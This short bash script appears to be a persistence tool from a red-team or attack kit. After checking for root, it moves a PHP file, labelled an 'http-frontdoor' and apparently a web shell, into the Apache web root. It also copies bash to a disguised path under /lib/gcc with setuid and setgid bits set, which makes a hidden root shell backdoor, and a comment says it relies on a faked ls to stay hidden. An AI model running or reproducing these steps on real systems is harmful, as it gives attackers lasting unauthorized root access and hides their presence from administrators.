# relies on false ls to hide
if [[ $(id -u) != "0" ]]; then
    echo "Must run as root"
    exit 1
fi

# Add http-frontdoor if apache running
if ! [[ -z $(systemctl status apache2 | grep "Active:" | grep "running") ]]; then
    echo "Apache2 running";
    mv ./rt_709505.php /var/www/html
fi

OUT_FOLDER="/lib/gcc"
OUT_FILE="$OUT_FOLDER/rt_709505"
cp $(which bash) "$OUT_FILE"
chmod 6755 "$OUT_FILE"

